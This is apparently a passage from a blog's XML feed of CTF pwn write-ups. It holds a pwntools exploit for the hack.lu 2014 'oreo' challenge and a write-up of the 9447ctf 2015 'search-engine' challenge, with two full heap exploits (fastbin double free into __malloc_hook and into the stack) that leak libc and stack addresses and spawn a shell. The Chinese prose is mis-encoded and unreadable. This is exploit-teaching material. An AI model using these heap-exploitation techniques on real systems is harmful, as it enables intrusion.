src="/2023/02/02/hack-lu-CTF-2014-OREO/replace_enter_0.png" class title="replace_enter_0"></li></ul><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">description,name</span>):<br>    p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendline(name)<br>    p.sendline(description)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>():<br>    p.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">message</span>(<span class="hljs-params">notice</span>):<br>    p.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendline(notice)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stats</span>():<br>    p.sendline(<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br>p=process(<span class="hljs-string">&#x27;./oreo&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./oreo&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;Q&#x27;</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>*<span class="hljs-number">0x1b</span>+p32(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>show()<br>p.recvuntil(<span class="hljs-string">b&#x27;Name: \nDescription: &#x27;</span>)<br>s=p.recv()[:<span class="hljs-number">4</span>]<br>libcbase=u32(s)-libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x3f</span>):<br>    add(<span class="hljs-string">b&#x27;Q&#x27;</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;Q&#x27;</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>*<span class="hljs-number">0x1b</span>+p32(<span class="hljs-number">0x804a2a8</span>))<br>message(<span class="hljs-string">b&#x27;Q&#x27;</span>*(<span class="hljs-number">0x38</span>-<span class="hljs-number">0x18</span>-<span class="hljs-number">4</span>)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0x40</span>)+p32(<span class="hljs-number">0x21</span>))<br>delete()<br>system_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(p32(<span class="hljs-number">0x804a250</span>-<span class="hljs-number">8</span>),<span class="hljs-string">b&#x27;a&#x27;</span>)<br>gdb.attach(p)<br>pause()<br>message(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p32(system_addr))<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>house of spirit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2015 9447ctf search-engine</title>
    <link href="/2023/01/31/2015-9447ctf-search-engine/"/>
    <url>/2023/01/31/2015-9447ctf-search-engine/</url>
    
    <content type="html"><![CDATA[<p>ä¸¤ç§åšæ³•ï¼Œæ‰“æ ˆæˆ–è€…malloc_hookã€‚fastbin_dup_into_stackåªæ˜¯fake chunkåœ¨æ ˆä¸Šæ²¡å•¥å¥½å†™çš„å°±ä¸å†™ä¸“é—¨çš„åšå®¢äº†<br>æ„Ÿæƒ³ï¼šå¥½åç‰¢å¥½åç‰¢è¿™é“é¢˜çœŸçš„åšçš„å¥½åç‰¢(â•¯â€µâ–¡â€²)â•¯ï¸µâ”»â”â”»ï¼ï¼ï¼é™æ€åˆ†æè¿˜æ˜¯ä¸è¡Œå‘œå‘œå‘œ</p><span id="more"></span><h1 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h1><p>ä¸»è¦ä¸¤ä¸ªåŠŸèƒ½å‡½æ•°ï¼Œä¸€ä¸ªè¾“å…¥sentenceæå–å…¶ä¸­çš„wordåŠ å…¥é“¾è¡¨ï¼ˆ2-indexï¼‰ï¼Œå¦ä¸€ä¸ªæŸ¥æ‰¾å•è¯ï¼ˆ1-searchï¼‰</p><img src="/2023/01/31/2015-9447ctf-search-engine/main.png" class title="main"><img src="/2023/01/31/2015-9447ctf-search-engine/menu.png" class title="menu"><p>ä¸»è¦åˆ†æå››ä¸ªå‡½æ•°ï¼Œindexå’Œsearchä¸¤ä¸ªåŠŸèƒ½å‡½æ•°ï¼Œread_numè¯»å–æ“ä½œæ•°çš„å‡½æ•°ï¼ˆfastbin_dup_into_stackç”¨ï¼‰ï¼Œread_enterè¯»å…¥å†…å®¹</p><h2 id="read-enter"><a href="#read-enter" class="headerlink" title="read_enter"></a>read_enter</h2><p>ä¸‰ä¸ªå‚æ•°a1ï¼Œa2ï¼Œa3ï¼š</p><ul><li>a1æ˜¯å­—ç¬¦å†™å…¥çš„åœ°å€</li><li>a2æ˜¯è¯»å…¥å­—èŠ‚ä¸ªæ•°</li><li>a3æ˜¯ä¸€ä¸ªé€‰é¡¹ã€‚a3&#x3D;&#x3D;1æ—¶è¡¨ç¤ºé‡åˆ°â€™\nâ€™æ—¶è¯»å…¥ç»ˆæ­¢å¹¶å°†â€™\nâ€™æ¢æˆç©ºå­—ç¬¦ï¼Œa3&#x3D;&#x3D;0æ—¶ç›´åˆ°è¯»å…¥a2å­—èŠ‚ç¨‹åºç»ˆæ­¢ï¼Œæ²¡æœ‰ç»“æŸç¬¦<img src="/2023/01/31/2015-9447ctf-search-engine/read_enter.png" class title="read_enter"></li></ul><h2 id="read-num"><a href="#read-num" class="headerlink" title="read_num"></a>read_num</h2><ul><li>read_enterè¯»å…¥48å­—èŠ‚ï¼Œå…è®¸â€™\nâ€™æå‰ç»ˆæ­¢è¯»å…¥</li><li>nptrè½¬æ¢ä¸ºæ•°å­—ï¼Œå¦‚æœè¾“å…¥éæ•°å­—ä¼šè¾“å‡ºè¾“å…¥å†…å®¹ï¼Œé€’å½’æ‰§è¡Œread_num<img src="/2023/01/31/2015-9447ctf-search-engine/read_num.png" class title="read_num"></li></ul><h2 id="index"><a href="#index" class="headerlink" title="index"></a>index</h2><ul><li>mallocä¸€ä¸ªsentence chunkï¼Œè¯»å…¥å¥å­ï¼ˆå›ºå®šé•¿åº¦è¯»å…¥ä¸”æ— ç»“æŸç¬¦ï¼‰å¹¶åˆå§‹åŒ–ä¸€äº›å˜é‡<img src="/2023/01/31/2015-9447ctf-search-engine/index1.png" class title="index1"></li><li>åˆå§‹åŒ–ç¬¬ä¸€ä¸ªword chunkã€‚word chunkå­˜äº”ä¸ªåœ°å€ï¼šwordçš„åœ°å€ï¼ˆæŒ‡å‘sentence chunkå†…ï¼‰ã€wordçš„é•¿åº¦ã€sentenceçš„åœ°å€ï¼Œsentenceçš„é•¿åº¦ã€ä¸‹ä¸€ä¸ªword chunkçš„åœ°å€<img src="/2023/01/31/2015-9447ctf-search-engine/index2.png" class title="index2"></li><li>åˆ†è¯ï¼Œå°†wordé“¾å…¥é“¾è¡¨<img src="/2023/01/31/2015-9447ctf-search-engine/index3.png" class title="index3"></li></ul><h2 id="search"><a href="#search" class="headerlink" title="search"></a>search</h2><p>æµç¨‹ä¸éš¾ï¼Œå°±æ˜¯è¦æ³¨æ„ç¬¬17è¡Œçš„åˆ¤æ–­ï¼ˆé™æ€åˆ†æçš„æ—¶å€™æ²¡æ³¨æ„å¯¼è‡´åç‰¢å·¨ä¹…ï¼‰</p><img src="/2023/01/31/2015-9447ctf-search-engine/search.png" class title="search"><h1 id="ä¸¤ç§æ–¹æ³•"><a href="#ä¸¤ç§æ–¹æ³•" class="headerlink" title="ä¸¤ç§æ–¹æ³•"></a>ä¸¤ç§æ–¹æ³•</h1><h2 id="æ‰“malloc-hook"><a href="#æ‰“malloc-hook" class="headerlink" title="æ‰“malloc_hook"></a>æ‰“malloc_hook</h2><h3 id="æ³„éœ²libcåŸºå€"><a href="#æ³„éœ²libcåŸºå€" class="headerlink" title="æ³„éœ²libcåŸºå€"></a>æ³„éœ²libcåŸºå€</h3><p>ç”±äºsearchä¼šåœ¨åˆ é™¤sentenceåæ¸…ç©ºchunkï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡searchç›¸åŒsizeçš„ç©ºå­—ç¬¦æ‰¾åˆ°ç›¸åº”çš„word chunkï¼Œå®ç°uaf<br>æ³¨æ„ç”³è¯·chunkçš„sizeå¯¹é½0x10ï¼Œä¸ç„¶next chunkçš„presizeä¼šè¢«ä½¿ç”¨ï¼Œfreeè¿›unsorted binä¼šè®¾ç½®presizeé€ æˆè¿™éƒ¨åˆ†å†…å®¹ä¸ç©ºï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º</p><img src="/2023/01/31/2015-9447ctf-search-engine/presize.png" class title="presize"><h3 id="åˆ¶é€ fastbin-double-free"><a href="#åˆ¶é€ fastbin-double-free" class="headerlink" title="åˆ¶é€ fastbin double free"></a>åˆ¶é€ fastbin double free</h3><p>è¿™é“é¢˜åˆ¶é€ double freeçš„æ—¶å€™ä¸ä¸€æ ·çš„ä¸€ç‚¹æ˜¯è¦mallocä¸‰ä¸ªå—è€Œä¸æ˜¯ä¸¤ä¸ªã€‚å› ä¸ºsearchæ—¶ä¼šå…ˆæ£€æµ‹sentenceæ˜¯å¦ä¸ºç©ºï¼Œè€Œfastbinçš„æœ€åä¸€ä¸ªchunkçš„fdæŒ‡é’ˆï¼ˆchunkçš„dataæ®µå¼€å§‹ï¼‰ä¸ºnullé‚£ä¹ˆå°±ç›¸å½“äºsentenceä¸ºç©ºï¼Œéå†é“¾è¡¨çš„æ—¶å€™ä¼šè·³è¿‡ã€‚æ‰€ä»¥ç¬¬ä¸€ä¸ªfreeçš„chunkæ˜¯æ²¡æ³•ç”¨çš„ã€‚</p><h3 id="æ”¹fdæ‰“malloc-hook"><a href="#æ”¹fdæ‰“malloc-hook" class="headerlink" title="æ”¹fdæ‰“malloc_hook"></a>æ”¹fdæ‰“malloc_hook</h3><p>è¿™å°±æ²¡å•¥äº†ï¼Œå¥—è·¯</p><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,sentence</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the sentence size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Enter the sentence:\n&#x27;</span>,sentence)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">size,word,delete</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the word size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Enter the word:\n&#x27;</span>,word)<br>    p.recvuntil(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>    s=p.recvuntil(<span class="hljs-string">b&#x27;Delete&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27; this sentence (y/n)?\n&#x27;</span>,delete)<br>    <span class="hljs-keyword">return</span> s<br><br>p=process(<span class="hljs-string">&#x27;./search&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)<br>add(<span class="hljs-number">0x10a</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span>+<span class="hljs-string">b&#x27; b&#x27;</span>)<br>x=index(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;b&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>x=index(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>,<span class="hljs-string">b&#x27;n&#x27;</span>)<br>libcbase=u64(x[:<span class="hljs-number">8</span>])-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x68</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x5d</span>+<span class="hljs-string">b&#x27; dd&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x5d</span>+<span class="hljs-string">b&#x27; dd&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x5d</span>+<span class="hljs-string">b&#x27; dd&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter the word size:\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Enter the word:\n&#x27;</span>,<span class="hljs-string">b&#x27;dd&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter the word size:\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Enter the word:\n&#x27;</span>,<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>malloc_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>one_addr=libcbase+<span class="hljs-number">0xf0897</span><br>add(<span class="hljs-number">0x60</span>,p64(malloc_addr-<span class="hljs-number">0x23</span>)+<span class="hljs-string">b&#x27;0&#x27;</span>*<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;z&#x27;</span>*<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;x&#x27;</span>*<span class="hljs-number">0x60</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x13</span>+p64(one_addr)+(<span class="hljs-number">0x60</span>-<span class="hljs-number">8</span>-<span class="hljs-number">0x13</span>)*<span class="hljs-string">b&#x27;c&#x27;</span>)<br><span class="hljs-comment">#p.recv()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="æ‰“æ ˆ"><a href="#æ‰“æ ˆ" class="headerlink" title="æ‰“æ ˆ"></a>æ‰“æ ˆ</h2><p>è·Ÿä¸Šä¸€ç§æ–¹æ³•ä¸ä¸€æ ·çš„ç‚¹å°±æ˜¯å¼€å§‹è¦æ³„éœ²æ ˆåœ°å€ä»¥åŠåœ¨æœ€ååœ¨æ ˆä¸Šæ‰¾fake chunk</p><h3 id="æ³„éœ²æ ˆåœ°å€"><a href="#æ³„éœ²æ ˆåœ°å€" class="headerlink" title="æ³„éœ²æ ˆåœ°å€"></a>æ³„éœ²æ ˆåœ°å€</h3><p>å°±æ˜¯åˆ©ç”¨read_enterè¯»å…¥48å­—èŠ‚æ—¶ä¸æ·»åŠ ç»“æŸç¬¦å’Œread_numå¦‚æœè¾“å…¥éæ•°å­—çš„è¯ä¼šè¾“å‡ºè¾“å…¥çš„å­—ç¬¦ä¸²ï¼ˆä¸”é€’å½’è°ƒç”¨è‡ªå·±ï¼‰æ³„éœ²æ ˆä¸Šçš„å†…å®¹<br>è°ƒç”¨ä¸¤æ¬¡å°±èƒ½æ³„éœ²å‡ºä¸€ä¸ªæ ˆä¸Šçš„åœ°å€</p><img src="/2023/01/31/2015-9447ctf-search-engine/stack.png" class title="stack"><h3 id="æ‰¾fake-chunk"><a href="#æ‰¾fake-chunk" class="headerlink" title="æ‰¾fake chunk"></a>æ‰¾fake chunk</h3><p>è¿™é‡Œæˆ‘ä»¬åŠ«æŒmainå‡½æ•°çš„è¿”å›åœ°å€__libc_start_main+240ï¼Œå¯ä»¥åˆ©ç”¨gdbçš„find_fake_fastæ‰¾fake chunk</p><img src="/2023/01/31/2015-9447ctf-search-engine/return.png" class title="return"><p>æ³¨ï¼šæˆ‘æœ€å¼€å§‹æƒ³åŠ«æŒsub_400D60çš„è¿”å›åœ°å€ã€‚æœ€å¼€å§‹æ‰¾äº†ä¸ª7fçš„fake chunkï¼Œä½†æ˜¾ç¤ºmalloc(): memory corruption (fast)äº†ã€‚æœ€åå‘ç°æ˜¯å› ä¸ºmallocçš„æ—¶å€™æ ˆä¸Šçš„å†…å®¹æ”¹å˜å¯¼è‡´7fæ²¡äº†</p><img src="/2023/01/31/2015-9447ctf-search-engine/malloc1.png" class title="malloc1"><img src="/2023/01/31/2015-9447ctf-search-engine/malloc2.png" class title="malloc2"><h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,sentence</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the sentence size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Enter the sentence:\n&#x27;</span>,sentence)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">size,word,delete</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the word size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Enter the word:\n&#x27;</span>,word)<br>    p.recvuntil(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>    s=p.recvuntil(<span class="hljs-string">b&#x27;Delete&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27; this sentence (y/n)?\n&#x27;</span>,delete)<br>    <span class="hljs-keyword">return</span> s<br><br>p=process(<span class="hljs-string">&#x27;./search&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">48</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;is not a valid number\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">48</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">48</span>)<br>stack=u64(p.recv()[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))+<span class="hljs-number">0x68</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter the sentence size:\n&#x27;</span>,<span class="hljs-string">b&#x27;0x10a&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Enter the sentence:\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span>+<span class="hljs-string">b&#x27; b&#x27;</span>)<br><span class="hljs-comment">#add(0x10a,b&#x27;a&#x27;*0x108+b&#x27; b&#x27;)</span><br>x=index(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;b&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>x=index(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>,<span class="hljs-string">b&#x27;n&#x27;</span>)<br>libcbase=u64(x[:<span class="hljs-number">8</span>])-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x68</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x2d</span>+<span class="hljs-string">b&#x27; dd&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x2d</span>+<span class="hljs-string">b&#x27; dd&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x2d</span>+<span class="hljs-string">b&#x27; dd&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter the word size:\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Enter the word:\n&#x27;</span>,<span class="hljs-string">b&#x27;dd&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter the word size:\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Enter the word:\n&#x27;</span>,<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br><span class="hljs-comment">#malloc_addr=libcbase+libc.symbols[&#x27;__malloc_hook&#x27;]</span><br>one_addr=libcbase+<span class="hljs-number">0xf0897</span><br>add(<span class="hljs-number">0x30</span>,p64(stack-<span class="hljs-number">0x16</span>)+<span class="hljs-string">b&#x27;0&#x27;</span>*<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;z&#x27;</span>*<span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;x&#x27;</span>*<span class="hljs-number">0x30</span>)<br>gdb.attach(p)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">6</span>+p64(one_addr)+(<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>-<span class="hljs-number">6</span>)*<span class="hljs-string">b&#x27;c&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><span class="hljs-comment">#p.recv()</span><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fastbin dup</tag>
      
      <tag>fastbin dup into stack</tag>
      
    </tags>
    
